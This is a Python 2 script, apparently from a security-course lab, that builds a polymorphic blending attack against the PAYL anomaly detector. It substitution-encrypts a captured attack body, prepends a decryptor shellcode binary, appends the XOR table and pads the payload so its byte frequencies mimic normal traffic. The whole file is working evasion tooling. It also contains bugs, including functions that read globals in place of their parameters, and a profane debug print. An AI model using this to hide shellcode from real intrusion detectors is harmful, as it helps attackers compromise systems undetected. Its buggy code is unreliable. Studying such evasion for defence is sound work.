#!/usr/bin/env python2
import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "artificial-profile.pcap"
ATTACKBODY_PATH = "../PAYL/test/cmin31.pcap"  # replace the file name by the one you downloaded


def get_next_mod_4(xor_table):
    m = len(xor_table) % 4
    return len(xor_table) + (4 - m)

def compare_freq(artificial_payload, attack_payload):
    artificial_frequency = frequency(artificial_payload)
    attack_frequency = frequency(raw_payload)
    sorted_artificial_frequency = sorting(artificial_frequency)
    sorted_attack_frequency = sorting(attack_frequency)

    no_match = []
    for k, v in attack_frequency.items():
        for k1, v1 in artificial_frequency.items():
            # if k1 == k and v1 != v and (k, v1, v) not in no_match:
            if k1 == k:
                no_match.append((k, v, v1))
            # elif k not in attack_frequency and (k, v) not in no_match:
            #     no_match.append((k, v))
            #     continue
            # elif k1 not in artificial_frequency and (k1, v1) not in no_match:
            #     no_match.append((k1, v1))
            #     continue
    print('Char | att freq | art freq')
    for x in no_match:
        print(x)

def check_if_valid_char(artifical_payload, raw_payload):
    for i in raw_payload:
        if str(i) not in artificial_payload:
            print('fuck', i)

if __name__ == '__main__':
    # Read in source pcap file and extract tcp payload
    attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
    artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)

    # Generate substitution table based on byte frequency in file
    substitution_table = getSubstitutionTable(artificial_payload, attack_payload)

    # Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)

    # For xor operation, should be a multiple of 4
    # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
    l = max(get_next_mod_4(xor_table), get_next_mod_4(adjusted_attack_body))
    while len(xor_table) < 128 or len(xor_table) < l:
        xor_table.append(chr(0))

    # For xor operation, should be a multiple of 4
    # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
    while len(adjusted_attack_body) < 128 or len(adjusted_attack_body) < l:
        adjusted_attack_body.append(chr(0))

    # Read in decryptor binary to append at the start of payload
    with open("shellcode.bin", mode='rb') as file:
        shellcode_content = file.read()

    # Prepare byte list for payload
    b_list = []
    for b in shellcode_content:
        b_list.append(b)

    # Raw payload will be constructed by encrypted attack body and xor_table
    raw_payload = b_list + adjusted_attack_body + xor_table
    # raw_payload = adjusted_attack_body
    while len(raw_payload) < len(artificial_payload):
        padding(artificial_payload, raw_payload)

    compare_freq(artificial_payload, raw_payload)
    check_if_valid_char(artificial_payload, raw_payload)
    # Write prepared payload to Output file and test against your PAYL model
    open('output', 'w')
    with open("output", "w") as result_file:
        result_file.write(''.join(raw_payload))

